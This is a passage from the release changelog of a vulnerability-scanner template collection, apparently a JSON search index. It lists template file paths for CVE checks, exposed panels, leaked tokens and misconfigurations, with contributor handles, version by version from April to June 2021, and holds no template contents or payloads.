@dhiyaneshDK vulnerabilities/wordpress/wp-multiple-theme-ssrf.yaml by @madrobot vulnerabilities/wordpress/wp-plugin-utlimate-member.yaml by @pussycat0x vulnerabilities/wordpress/wpmudev-my-calender-xss.yaml by @dhiyaneshDk vulnerabilities/wordpress/wpmudev-pub-keys.yaml by @dhiyaneshDk vulnerabilities/other/huawei-hg659-lfi.yaml by @pikpikcu vulnerabilities/other/jeewms-lfi.yaml by @pikpikcu vulnerabilities/other/resin-inputfile-fileread.yaml by @princechaddha vulnerabilities/other/resin-viewfile-lfr.yaml by @princechaddha default-logins/zmanda/zmanda-default-credential.yaml by @Techryptic misconfiguration/aem/aem-crx-bypass.yaml by @dhiyaneshDK misconfiguration/phpmyadmin-sql.php-server.yaml by @pussycat0x misconfiguration/zhiyuan-oa-unauthorized.yaml by @pikpikcu takeovers/flywheel-takeover.yaml by @smaranchand takeovers/sprintful-takeover.yaml by @Mhdsamx exposed-panels/adobe-experience-manager-login.yaml by @dhiyaneshDK exposed-panels/akamai-cloudtest.yaml by @emadshanab exposed-panels/avtech-dvr-exposure.yaml by @geeknik exposed-panels/calendarix-panel.yaml by @r3dg33k exposed-panels/iptime-router.yaml by @gy741 exposed-panels/jenkins-api-panel.yaml by @righettod exposed-panels/livezilla-login-panel.yaml by @__Fazal exposed-panels/mikrotik-routeros.yaml by @gy741 exposed-panels/netis-router.yaml by @gy741 exposed-panels/plastic-scm-login.yaml by @dhiyaneshDK exposed-panels/sitecore-login-panel.yaml by @b4uh0lz exposed-panels/zoho-manageengine-adaudit.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-adselfservice-plus.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-analyticsplus.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-apex-helpdesk.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-applications-manager.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-assetexplorer.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-desktop.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-opmanager.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-servicedesk.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-supportcenter.yaml by @dhiyaneshDK miscellaneous/addeventlistener-detect.yaml by @yavolo miscellaneous/clientaccesspolicy.yaml by @emadshanab network/expn-mail-detect.yaml by @r3dg33k network/smb-v1-detection.yaml by @r3dg33k network/smtp-detection.yaml by @r3dg33k network/starttls-mail-detect.yaml by @r3dg33k network/vsftpd-detection.yaml by @pussycat0x technologies/rhymix-cms-detect.yaml by @gy741 technologies/webmodule-ee.yaml by @pussycat0x","title":"Templates v8.3.7 - 30 June 2021"},{"location":"releases/templates-changelog/#templates-v836-18-june-2021","text":"Newly added templates (30) cves/2021/CVE-2021-28854.yaml by pdteam cves/2021/CVE-2021-24237.yaml by @Akokonunes cves/2021/CVE-2021-22214.yaml by @skar4444 cves/2019/CVE-2019-7254.yaml by @Akokonunes cves/2018/CVE-2018-1000533.yaml by @pikpikcu cves/2018/CVE-2018-16668.yaml by @geeknik cves/2018/CVE-2018-16670.yaml by @geeknik cves/2018/CVE-2018-16671.yaml by @geeknik cves/2013/CVE-2013-2248.yaml by @Akokonunes cnvd/CNVD-2021-15822.yaml by @pikpikcu vulnerabilities/confluence/confluence-ssrf-sharelinks.yaml by @Techbrunch vulnerabilities/gitlab/gitlab-user-enumeration.yaml by @skar4444 vulnerabilities/gitlab/gitlab-user-open-api.yaml by @skar4444 vulnerabilities/other/tamronos-rce.yaml by @pikpikcu vulnerabilities/wordpress/wpdm-cache-session.yaml by @DhiyaneshGeek misconfiguration/adobe/adobe-connect-username-exposure.yaml by @DhiyaneshGeek misconfiguration/adobe/adobe-connect-version.yaml by @DhiyaneshGeek misconfiguration/ssrf-via-oauth-misconfig.yaml by @mrsin15 default-logins/gitlab/gitlab-weak-login.yaml by @skar4444 exposed-panels/adobe-connect-central-login.yaml by @DhiyaneshGeek exposed-panels/glpi-login.yaml by @DhiyaneshGeek exposed-panels/odoo-database-manager.yaml by @linfatall network/openssh-username-enumeration.yaml by @r3dg33k dns/nameserver-detection.yaml by pdteam headless/extract-urls.yaml by @dwisiswant0 technologies/detect-sentry.yaml by @Sicks3c technologies/metabase-detect.yaml by @revblock technologies/sap-web-dispatcher-admin-portal.yaml by @randomstr1ng technologies/sap-web-dispatcher.yaml by @randomstr1ng technologies/vmware-vrealize-detect.yaml by @milo2012","title":"Templates v8.3.6 - 18 June 2021"},{"location":"releases/templates-changelog/#templates-v835-13-june-2021","text":"Newly added templates (56) cves/2018/CVE-2018-16836.yaml by @Akokonunes cves/2017/CVE-2017-5487.yaml by @Manas_Harsh , @daffainfo cves/2014/CVE-2014-2383.yaml by @Akokonunes exposed-panels/landfill-remote-monitoring-control.yaml by @geeknik exposed-panels/rstudio-detect.yaml by @pdelteil exposures/configs/phalcon-framework-source.yaml by @pdelteil exposures/tokens/generic/shoppable-token.yaml by @pdelteil fuzzing/mdb-database-file.yaml by pdteam technologies/nexus-detect.yaml by @righettod vulnerabilities/other/ckan-dom-based-xss.yaml by @DhiyaneshGeek vulnerabilities/other/mpsec-lfi.yaml by @pikpikcu vulnerabilities/other/php-timeclock-xss.yaml by @pikpikcu vulnerabilities/other/php-zerodium-backdoor-rce.yaml by @DhiyaneshGeek vulnerabilities/wordpress/wordpress-db-backup-listing.yaml by @skar4444 file/android/adb-backup-enabled.yaml by @0xgaurang file/android/biometric-detect.yaml by @0xgaurang file/android/certificate-validation.yaml by @0xgaurang file/android/content-scheme.yaml by @0xgaurang file/android/debug-enabled.yaml by @0xgaurang file/android/dynamic-broadcast-receiver.yaml by @0xgaurang file/android/file-scheme.yaml by @0xgaurang file/android/provider-path.yaml by @0xgaurang file/android/webview-addjavascript-interface.yaml by @0xgaurang file/android/webview-javascript.yaml by @0xgaurang file/android/webview-load-url.yaml by @0xgaurang file/android/webview-universal-access.yaml by @0xgaurang file/keys/amazon-mws-auth-token.yaml by @0xgaurang file/keys/aws-access-id.yaml by @0xgaurang file/keys/aws-cognito.yaml by @0xgaurang file/keys/cloudinary.yaml by @0xgaurang file/keys/credentials.yaml by @0xgaurang file/keys/dynatrace-token.yaml by @0xgaurang file/keys/facebook-client-id.yaml by @0xgaurang file/keys/facebook-secret.yaml by @0xgaurang file/keys/firebase-database.yaml by @0xgaurang file/keys/gcp-service-account.yaml by @0xgaurang file/keys/google-api.yaml by @0xgaurang file/keys/linkedin-id.yaml by @0xgaurang file/keys/mailchimp-api.yaml by @0xgaurang file/keys/mailgun-api.yaml by @0xgaurang file/keys/paypal-braintree-token.yaml by @0xgaurang file/keys/pictatic-api-key.yaml by @0xgaurang file/keys/private-key.yaml by @0xgaurang file/keys/s3-bucket.yaml by @0xgaurang file/keys/sendgrid-api.yaml by @0xgaurang file/keys/shopify-custom-token.yaml by @0xgaurang file/keys/shopify-private-token.yaml by @0xgaurang file/keys/shopify-shared-secret.yaml by @0xgaurang file/keys/shopify-token.yaml by @0xgaurang file/keys/slack-api.yaml by @0xgaurang file/keys/slack-webhook.yaml by @0xgaurang file/keys/square-access-token.yaml by @0xgaurang file/keys/square-oauth-secret.yaml by @0xgaurang file/keys/stripe-api-key.yaml by @0xgaurang file/keys/twilio-api.yaml by @0xgaurang file/keys/twitter-secret.yaml by @0xgaurang","title":"Templates v8.3.5 - 13 June 2021"},{"location":"releases/templates-changelog/#templates-v834-10-june-2021","text":"Newly added templates (25) cves/2021/CVE-2021-24285.yaml by @shreyapohekar cves/2021/CVE-2021-24316.yaml by @Akokonunes cves/2020/CVE-2020-36289.yaml by @DhiyaneshGeek cves/2020/CVE-2020-6308.yaml by @Mad-robot cves/2019/CVE-2019-2767.yaml by @Mad-robot cves/2019/CVE-2019-2616.yaml by pdteam cves/2017/CVE-2017-9140.yaml by @DhiyaneshGeek vulnerabilities/other/interlib-fileread.yaml by @pikpikcu vulnerabilities/wordpress/wp-mailchimp-log-exposure.yaml by @AashiqRamachandran vulnerabilities/wordpress/wp-popup-listing.yaml by @AashiqRamachandran miscellaneous/apple-app-site-association.yaml by @DhiyaneshGeek miscellaneous/email-extractor.yaml by @DhiyaneshGeek misconfiguration/artifactory-anonymous-deploy.yaml by @DhiyaneshGeek misconfiguration/exposed-jquery-file-upload.yaml by @DhiyaneshGeek misconfiguration/private-key-exposure.yaml by @AashiqRamachandran misconfiguration/sap/sap-netweaver-info-leak.yaml by pdteam misconfiguration/iis-internal-ip-disclosure.yaml by @WillD96 exposed-panels/luci-login-detection.yaml by @AashiqRamachandran exposures/configs/zend-config-file.yaml by pdteam exposures/files/shellscripts.yaml by @DhiyaneshGeek network/sap-router-info-leak.yaml by pdteam network/sap-router.yaml by pdteam technologies/firebase-urls.yaml by @DhiyaneshGeek technologies/sap-netweaver-webgui.yaml by pdteam iot/epson-wf-series.yaml by @AashiqRamachandran","title":"Templates v8.3.4 - 10 June 2021"},{"location":"releases/templates-changelog/#templates-v833-4-june-2021","text":"Newly added templates (11) cves/2020/CVE-2020-11978.yaml by pdteam cnvd/CNVD-2021-30167.yaml by @pikpikcu default-logins/apache/airflow-default-credentials.yaml by pdteam vulnerabilities/other/odoo-cms-redirect.yaml by @Akokonunes exposures/configs/detect-drone-config.yaml by @geeknik misconfiguration/airflow/airflow-debug.yaml by pdteam misconfiguration/alibaba-mongoshake-unauth.yaml by @pikpikcu exposed-panels/airflow-panel.yaml by pdteam exposed-panels/dotcms-admin-panel.yaml by @impramodsargar technologies/airflow-detect.yaml by pdteam workflows/airflow-workflow.yaml by pdteam","title":"Templates v8.3.3 - 4 June 2021"},{"location":"releases/templates-changelog/#templates-v832-1-june-2021","text":"Newly added templates (41) cves/2021/CVE-2021-21985.yaml by @dorkerdevil cves/2017/CVE-2017-14535.yaml by @pikpikcu cves/2017/CVE-2017-3528.yaml by @Akokonunes vulnerabilities/other/blue-ocean-excellence-lfi.yaml by @pikpikcu vulnerabilities/other/hjtcloud-arbitrary-file-read.yaml by @pikpikcu vulnerabilities/other/hjtcloud-rest-arbitrary-file-read.yaml by @pikpikcu vulnerabilities/other/ns-asg-file-read.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-db-repair.yaml by @aldo-moreno-leon vulnerabilities/wordpress/wp-plugin-statistics-sqli.yaml by @Udyz exposures/configs/exposed-vscode.yaml by @AashiqRamachandran exposures/configs/hikvision-info-leak.yaml by @pikpikcu default-logins/arl/arl-default-password.yaml by @pikpikcu default-logins/szhe/szhe-default-password.yaml by @pikpikcu dns/dns-waf-detect.yaml by @1u4nx exposed-panels/clave-login-panel.yaml by @linfatall exposed-panels/ems-login-panel.yaml by @linfatall exposed-panels/lancom-router-panel.yaml by @linfatall exposed-panels/openerp-database.yaml by @impramodsargar exposed-panels/servicedesk-login-panel.yaml by @AashiqRamachandran exposed-panels/synnefo-admin-panel.yaml by @impramodsargar exposed-panels/zenario-login-panel.yaml by @linfatall technologies/default-apache-test-page.yaml by @DhiyaneshGeek technologies/default-apache2-page.yaml by @DhiyaneshGeek technologies/default-apache2-ubuntu-page.yaml by @DhiyaneshGeek technologies/default-asp.net-page.yaml by @DhiyaneshGeek technologies/default-centos-test-page.yaml by @DhiyaneshGeek technologies/default-django-page.yaml by @DhiyaneshGeek technologies/default-fastcgi-page.yaml by @DhiyaneshGeek technologies/default-fedora-page.yaml by @DhiyaneshGeek technologies/default-glassfish-server-page.yaml by @DhiyaneshGeek technologies/default-iis7-page.yaml by @DhiyaneshGeek technologies/default-jetty-page.yaml by @DhiyaneshGeek technologies/default-microsoft-azure-page.yaml by @DhiyaneshGeek technologies/default-nginx-page.yaml by @DhiyaneshGeek technologies/default-oracle-application-page.yaml by @DhiyaneshGeek technologies/default-payara-server-page.yaml by @DhiyaneshGeek technologies/default-plesk-page.yaml by @DhiyaneshGeek technologies/default-redhat-test-page.yaml by @DhiyaneshGeek technologies/default-ssltls-test-page.yaml by @DhiyaneshGeek technologies/default-tomcat-page.yaml by @DhiyaneshGeek technologies/default-windows-server-page.yaml by @DhiyaneshGeek","title":"Templates v8.3.2 - 1 June 2021"},{"location":"releases/templates-changelog/#templates-v831-29-may-2021","text":"Newly added templates (19) cves/2021/CVE-2021-33564.yaml by @0xsapra cves/2020/CVE-2020-35736.yaml by @pikpikcu cves/2017/CVE-2017-1000486.yaml by @Morn98 vulnerabilities/other/natshell-rce.yaml by @pikpikcu vulnerabilities/wordpress/wp-config-setup.yaml by @princechaddha vulnerabilities/wordpress/wp-full-path-disclosure.yaml by @blacklist-arcc vulnerabilities/wordpress/wp-install.yaml by @princechaddha vulnerabilities/wordpress/wp-localize-post-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-mail-masta-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-simple-fields-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-site-editor-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-tutor-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-wechat-broadcast-lfi.yaml by @0x240x23elu exposures/configs/esmtprc-config.yaml by @geeknik exposures/configs/robomongo-credential.yaml by @geeknik exposed-panels/portainer-init-deploy.yaml by @princechaddha exposed-panels/securenvoy-panel.yaml by @0xrod iot/xp-webcam.yaml by @AashiqRamachandran technologies/jsf-detection.yaml by @Morn98","title":"Templates v8.3.1 - 29 May 2021"},{"location":"releases/templates-changelog/#templates-v830-25-may-2021","text":"Newly added templates (14) cves/2021/CVE-2021-27850.yaml by pdteam cves/2020/CVE-2020-15227.yaml by @Becivells vulnerabilities/other/maian-cart-preauth-rce.yaml by pdteam misconfiguration/cx-cloud-upload-detect.yaml by @DhiyaneshGeek misconfiguration/kubeflow-dashboard-unauth.yaml by @DhiyaneshGeek misconfiguration/pinpoint-unauth.yaml by @DhiyaneshGeek default-logins/jenkins/jenkins-default.yaml by @Zandros0 exposed-panels/cx-cloud-login.yaml by @DhiyaneshGeek exposed-panels/jenkins-login.yaml by @Zandros0 exposed-panels/phppgadmin-panel.yaml by @Ganofins exposed-panels/plesk-obsidian.yaml by @DhiyaneshGeek exposed-panels/server-backup-login.yaml by @DhiyaneshGeek technologies/maian-cart-detect.yaml by pdteam technologies/xxljob-admin-detect.yaml by pdteam","title":"Templates v8.3.0 - 25 May 2021"},{"location":"releases/templates-changelog/#templates-v829-20-may-2021","text":"Newly added templates (19) cves/2021/CVE-2021-29622.yaml by @geeknik cves/2020/CVE-2020-36112.yaml by @geeknik cves/2009/CVE-2009-0545.yaml by @geeknik vulnerabilities/magento/magento-2-exposed-api.yaml by @techbrunch vulnerabilities/magento/magento-cacheleak.yaml by @techbrunch vulnerabilities/magento/magento-unprotected-dev-files.yaml by @techbrunch vulnerabilities/other/fanruanoa2012-disclosure.yaml by @bu1xuan2 misconfiguration/springboot/springboot-beans.yaml by @ajaysenr exposures/configs/nagios-status-page.yaml by @DhiyaneshGeek exposures/files/ioncube-loader-wizard.yaml by @Mubspatel exposed-panels/exposed-nomad.yaml by pdteam exposed-panels/magento-admin-panel.yaml by @techbrunch exposed-panels/saferoads-vms-login.yaml by @DhiyaneshGeek technologies/fanruanoa-detect.yaml by @bu1xuan2 technologies/fanruanoa2012-detect.yaml by @bu1xuan2 technologies/landrayoa-detect.yaml by @bu1xuan2 technologies/magento-detect.yaml by @techbrunch technologies/pega-detect.yaml by @sshell workflows/magento-workflow.yaml by @techbrunch","title":"Templates v8.2.9 - 20 May 2021"},{"location":"releases/templates-changelog/#templates-v828-17-may-2021","text":"Newly added templates (13) cves/2021/CVE-2021-24176.yaml by @Ganofins cves/2021/CVE-2021-27651.yaml by @idealphase cves/2014/CVE-2014-3744.yaml by @geeknik default-logins/flir/flir-ax8-default-credentials.yaml by @pikpikcu vulnerabilities/other/flir-path-traversal.yaml by @pikpikcu vulnerabilities/other/natshell-path-traversal.yaml by @pikpikcu vulnerabilities/other/resin-cnnvd-200705-315.yaml by @princechaddha exposures/files/joomla-file-listing.yaml by @iampritam97 miscellaneous/google-floc-disabled.yaml by @geeknik miscellaneous/tabnabbing-check.yaml by @bolli95 misconfiguration/unauthenticated-tensorboard.yaml by @DhiyaneshGeek technologies/octobercms-detect.yaml by @cydave technologies/voipmonitor-detect.yaml by @bu1xuan2","title":"Templates v8.2.8 - 17 May 2021"},{"location":"releases/templates-changelog/#templates-v827-16-may-2021","text":"Newly added templates (6) cves/2021/CVE-2021-31537.yaml by @geeknik misconfiguration/apache-filename-brute-force.yaml by @geeknik network/rdp-detect.yaml by @princechaddha default-logins/panabit/panabit-default-password.yaml by @pikpikcu technologies/springboot-actuator.yaml by pdteam technologies/wazuh-detect.yaml by @cydave","title":"Templates v8.2.7 - 16 May 2021"},{"location":"releases/templates-changelog/#templates-v826-12-may-2021","text":"Newly added templates (12) cves/2017/CVE-2017-12149.yaml by @fopina default-logins/showdoc/showdoc-default-password.yaml by @pikpikcu exposures/configs/ruijie-phpinfo.yaml by @pikpikcu exposures/logs/php-debug-bar.yaml by @DhiyaneshGeek misconfiguration/cloudflare-image-ssrf.yaml by @vavkamil misconfiguration/sap-directory-listing.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-netdata.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-zippkin.yaml by @DhiyaneshGeek vulnerabilities/other/showdoc-file-upload-rce.yaml by @pikpikcu exposed-panels/microsoft-exchange-control-panel.yaml by @r3dg33k exposures/backups/php-backup-files.yaml by @StreetOfHackerR007 fuzzing/xff-403-bypass.yaml by @vavkamil","title":"Templates v8.2.6 - 12 May 2021"},{"location":"releases/templates-changelog/#templates-v825-8-may-2021","text":"Newly added templates (15) cves/2021/CVE-2021-28073.yaml by @z3bd cves/2021/CVE-2021-30461.yaml by @shifacyclewala ,hackergautam cves/2020/CVE-2020-9490.yaml by @philippedelteil exposed-panels/bitrix-panel.yaml by @juicypotato1 exposed-panels/monitorix-exposure.yaml by @geeknik exposures/configs/plesk-stat.yaml by @th3 .d1p4k exposures/logs/darkstat-detect.yaml by @geeknik exposures/logs/pyramid-debug-toolbar.yaml by @geeknik exposures/logs/squid-analysis-report-generator.yaml by @geeknik misconfiguration/exposed-kafdrop.yaml by @DhiyaneshGeek vulnerabilities/oracle/oracle-ebs-xss.yaml by @DhiyaneshGeek vulnerabilities/other/joomla-com-fabrik-lfi.yaml by @DhiyaneshGeek vulnerabilities/other/kafdrop-xss.yaml by @DhiyaneshGeek vulnerabilities/other/ueditor-file-upload.yaml by @princechaddha vulnerabilities/other/wuzhicms-sqli.yaml by @princechaddha","title":"Templates v8.2.5 - 8 May 2021"},{"location":"releases/templates-changelog/#templates-v824-5-may-2021","text":"Newly added templates (15) cves/2021/CVE-2021-29441.yaml by @dwisiswant0 cves/2020/CVE-2020-7247.yaml by @princechaddha cves/2019/CVE-2019-8446.yaml by @dhiyaneshDk cves/2018/CVE-2018-10141.yaml by @dhiyaneshDk cves/2017/CVE-2017-12629.yaml by @dwisiswant0 cves/2017/CVE-2017-3506.yaml by @pdteam exposures/configs/oracle-ebs-credentials-disclosure.yaml by @dhiyaneshDk exposures/files/gogs-install-exposure.yaml by @dhiyaneshDk exposures/logs/oracle-ebs-sqllog-disclosure.yaml by @dhiyaneshDk misconfiguration/nginx/nginx-vhost-traffic-status.yaml by @geeknik technologies/kubernetes-version.yaml by @raesene vulnerabilities/other/concrete-xss.yaml by @shifacyclewla , @hackergautam vulnerabilities/other/ecology-filedownload-directory-traversal.yaml by @princechaddha vulnerabilities/other/gloo-unauth.yaml by @dhiyaneshDk vulnerabilities/other/hashicorp-consul-rce.yaml by @pikpikcu","title":"Templates v8.2.4 - 5 May 2021"},{"location":"releases/templates-changelog/#templates-v823-2-may-2021","text":"Newly added templates (37) cves/2021/CVE-2021-29442.yaml by @dwisiswant0 cves/2019/CVE-2019-13462.yaml by @securitytest3r cves/2020/CVE-2020-9054.yaml by @DhiyaneshGeek cves/2020/CVE-2020-9315.yaml by @DhiyaneshGeek exposed-panels/circarlife-setup.yaml by @geeknik exposed-panels/netscalar-aaa-login.yaml by @DhiyaneshGeek exposed-panels/sharecenter-login.yaml by @DhiyaneshGeek exposures/backups/exposed-mysql-initial.yaml by @Elsfa7-110 exposures/configs/apache-config.yaml by @hackerrishad exposures/configs/exposed-sharepoint-list.yaml by @Elsfa7-110 exposures/configs/httpd-config.yaml by @hackerrishad exposures/configs/nginx-config.yaml by @hackerrishad exposures/configs/php-fpm-config.yaml by @hackerrishad exposures/configs/proftpd-config.yaml by @hackerrishad exposures/configs/samba-config.yaml by @hackerrishad exposures/configs/svnserve-config.yaml by @hackerrishad exposures/logs/circarlife-system-log.yaml by @geeknik misconfiguration/aem/aem-bg-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-login-status.yaml by @DhiyaneshGeek misconfiguration/spidercontrol-scada-server-info.yaml by @geeknik misconfiguration/springboot/springboot-httptrace.yaml by @pdteam network/deprecated-sshv1-detection.yaml by @iamthefrogy network/ganglia-xml-grid-monitor.yaml by @geeknik network/java-rmi-detect.yaml by @F1tz network/weblogic-iiop-detect.yaml by @F1tz network/weblogic-t3-detect.yaml by @F1tz takeovers/freshservice-takeover.yaml by @pdelteil technologies/nginx-version.yaml by @pdelteil vulnerabilities/other/WooYun-2015-148227.yaml by @princechaddha vulnerabilities/other/chamilo-lms-sqli.yaml by @underfl0w vulnerabilities/other/ecology-springframework-directory-traversal.yaml by @princechaddha vulnerabilities/other/landray-oa-fileread.yaml by @pikpikcu vulnerabilities/other/spark-webui-unauth.yaml by @princechaddha vulnerabilities/other/unauth-spark-api.yaml by @princechaddha vulnerabilities/other/xiuno-bbs-reinstallation.yaml by @princechaddha vulnerabilities/other/xunchi-file-read.yaml by @princechaddha vulnerabilities/other/zcms-v3-sqli.yaml by @princechaddha","title":"Templates v8.2.3 - 2 May 2021"},{"location":"releases/templates-changelog/#templates-v822-23-april-2021","text":"Newly added templates (27) cves/2021/CVE-2021-27905.yaml by @shifa123 cves/2021/CVE-2021-24146.yaml by @random-robbie cves/2020/CVE-2020-35338.yaml by @jeyaseelan8 cves/2019/CVE-2019-15859.yaml by @geeknik cves/2019/CVE-2019-10068.yaml by @davidmckennirey cves/2018/CVE-2018-8770.yaml by @princechaddha cves/2018/CVE-2018-17246.yaml by @princechaddha cves/2017/CVE-2017-8917.yaml by @princechaddha cves/2017/CVE-2017-5521.yaml by @geeknik cves/2017/CVE-2017-15715.yaml by @geeknik cves/2015/CVE-2015-8399.yaml by @princechaddha cves/2015/CVE-2015-7297.yaml by @princechaddha cves/2014/CVE-2014-4210.yaml by @princechaddha cves/2014/CVE-2014-3704.yaml by @princechaddha cves/2014/CVE-2014-2321.yaml by @geeknik vulnerabilities/apache/apache-solr-file-read.yaml by @DhiyaneshGeek vulnerabilities/other/74cms-sqli.yaml by @princechaddha vulnerabilities/other/feifeicms-lfr.yaml by @princechaddha vulnerabilities/other/maccmsv10-backdoor.yaml by @princechaddha vulnerabilities/other/myucms-lfr.yaml by @princechaddha vulnerabilities/other/nuuo-file-inclusion.yaml by @princechaddha misconfiguration/unauthenticated-popup-upload.yaml by @DhiyaneshGeek default-logins/chinaunicom/chinaunicom-modem-default-credentials.yaml by @princechaddha default-logins/viewpoint/trilithic-viewpoint-default.yaml by @davidmckennirey exposed-panels/opennms-web-console.yaml by @DhiyaneshGeek exposures/configs/cisco-network-config.yaml by @DhiyaneshGeek technologies/grav-cms-detect.yaml by @cydave","title":"Templates v8.2.2 - 23 April 2021"},{"location":"releases/templates-changelog/#templates-v821-20-april-2021","text":"Newly added templates (24) cves/2021/CVE-2021-28937.yaml by @geeknik cves/2021/CVE-2021-3374.yaml by @geeknik cves/2020/CVE-2020-19625.yaml by @geeknik cves/2017/CVE-2017-12542.yaml by @pikpikcu cves/2019/CVE-2019-17270.yaml by @pikpikcu cves/2015/CVE-2015-1880.yaml by @pikpikcu cves/2011/CVE-2011-0049.yaml by @pikpikcu cves/2009/CVE-2009-1151.yaml by @princechaddha exposures/configs/exposed-authentication-asmx.yaml by @DhiyaneshGeek exposures/configs/kyan-network-credentials-disclosure.yaml by @pikpikcu exposures/configs/ruijie-smartweb-disclosure.yaml by @pikpikcu exposures/configs/saia-web-server-info.yaml by @DhiyaneshGeek exposures/configs/ssh-authorized-keys.yaml by @geeknik exposures/configs/ssh-known-hosts.yaml by @geeknik exposures/files/phpunit.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-wordfence-waf-bypass-xss.yaml by @shifa123 misconfiguration/laravel-debug-enabled.yaml by @notsoevilweasel misconfiguration/sonarqube-public-projects.yaml by @sickwell exposed-panels/polycom-login.yaml by @DhiyaneshGeek exposed-panels/sauter-login.yaml by @DhiyaneshGeek fuzzing/wordpress-plugins-detect.yaml by @0xcrypto fuzzing/wordpress-themes-detect.yaml by @0xcrypto technologies/mautic-crm-detect.yaml by @cydave technologies/plone-cms-detect.yaml by @cydave","title":"Templates v8.2.1 - 20 April 2021"},{"location":"releases/templates-changelog/#templates-v820-14-april-2021","text":"Newly added templates (73) exposed-tokens moved under exposures/tokens directory. cves/2021/CVE-2021-30151.yaml by @DhiyaneshDk cves/2020/CVE-2020-15500.yaml by @Akash .C cves/2020/CVE-2020-35846.yaml by @dwisiswant0 cves/2020/CVE-2020-35847.yaml by @dwisiswant0 cves/2020/CVE-2020-35848.yaml by @dwisiswant0 cves/2018/CVE-2018-2894.yaml by @geeknik cves/2018/CVE-2018-7422.yaml by @LuskaBol cves/2017/CVE-2017-7921.yaml by @princechaddha misconfiguration/aem/aem-default-get-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-gql-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-hash-querybuilder.yaml by @DhiyaneshGeek misconfiguration/aem/aem-jcr-querybuilder.yaml by @DhiyaneshGeek misconfiguration/aem/aem-merge-metadata-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-querybuilder-feed-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-querybuilder-internal-path-read.yaml by @DhiyaneshGeek misconfiguration/aem/aem-querybuilder-json-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-userinfo-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-wcm-suggestions-servlet.yaml by @DhiyaneshGeek misconfiguration/aws-object-listing.yaml by @DhiyaneshGeek misconfiguration/gitlab/gitlab-user-enumeration.yaml by @pikpikcu misconfiguration/unautneicated-cache-purge.yaml by @xElkomy vulnerabilities/moodle/moodle-xss.yaml by @shifa123 vulnerabilities/other/core-chuangtian-cloud-rce.yaml by @pikpikcu vulnerabilities/other/empirecms-xss.yaml by @pikpikcu vulnerabilities/other/erp-nc-directory-traversal.yaml by @pikpikcu vulnerabilities/other/etouch-v2-sqli.yaml by @pikpikcu vulnerabilities/other/eyou-email-rce.yaml by @pikpikcu vulnerabilities/other/oa-v9-uploads-file.yaml by @pikpikcu vulnerabilities/other/qi-anxin-netkang-next-generation-firewall-rce.yaml by @pikpikcu vulnerabilities/other/turbocrm-xss.yaml by @pikpikcu network/mysql-native-cred-bruteforce.yaml by @iamthefrogy network/openssh5.3-detect.yaml by @iamthefrogy default-logins/nagios/nagios-default-credential.yaml by @iamthefrogy default-logins/smartweb/ruijie-smartweb-default-password.yaml by @pikpikcu exposed-panels/somfy-login.yaml by @DhiyaneshGeek exposures/configs/coremail-config-disclosure.yaml by @princechaddha exposures/configs/s3cmd-config.yaml by @Ice3man543 exposures/configs/yii-debugger.yaml by @geeknik exposures/logs/access-log.yaml by @sheikhrishad exposures/logs/laravel-telescope.yaml by @geeknik exposures/tokens/amazon/amazon-sns-topic.yaml by @Ice3man543 exposures/tokens/artifactory/artifactory-api-password.yaml by @Ice3man543 exposures/tokens/artifactory/artifactory-api-token.yaml by @Ice3man543 exposures/tokens/bitly/bitly-secret-key.yaml by @Ice3man543 exposures/tokens/cloudinary/cloudinary-credentials.yaml by @Ice3man543 exposures/tokens/discord/discord-webhook.yaml by @Ice3man543 exposures/tokens/generic/jdbc-connection-string.yaml by @Ice3man543 exposures/tokens/generic/jwt-token.yaml by @Ice3man543 exposures/tokens/google/google-calendar-link.yaml by @Ice3man543 exposures/tokens/google/oauth-access-key.yaml by @Ice3man543 exposures/tokens/microsoft/microsoft-teams-webhook.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-admin-api-key.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-insights-key.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-rest-api-key.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-synthetics-location-key.yaml by @Ice3man543 exposures/tokens/paypal/braintree-access-token.yaml by @Ice3man543 exposures/tokens/picatic/picatic-api-key.yaml by @Ice3man543 exposures/tokens/sendgrid/sendgrid-api-key.yaml by @Ice3man543 exposures/tokens/slack/slack-user-token.yaml by @Ice3man543 exposures/tokens/slack/slack-webhook-token.yaml by @Ice3man543 exposures/tokens/sonarqube/sonarqube-token.yaml by @Ice3man543 exposures/tokens/stripe/stripe-restricted-key.yaml by @Ice3man543 exposures/tokens/stripe/stripe-secret-key.yaml by @Ice3man543 exposures/tokens/zapier/zapier-webhook-token.yaml by @Ice3man543 exposures/tokens/zoho/zoho-webhook-token.yaml by @Ice3man543 miscellaneous/display-via-header.yaml by @geeknik technologies/aws-bucket-service.yaml by @pdteam technologies/cockpit-detect.yaml by @dwisiswant0 technologies/google-bucket-service.yaml by @pdteam workflows/aem-workflow.yaml by @DhiyaneshGeek workflows/cockpit-workflow.yaml by @dwisiswant0 workflows/gitlab-workflow.yaml by @pdteam workflows/ruijie-workflow.yaml by @pikpikcu","title":"Templates v8.2.0 - 14 April 2021"},{"location":"releases/templates-changelog/#templates-v819-2-april-2021","text":"Newly added templates (7) 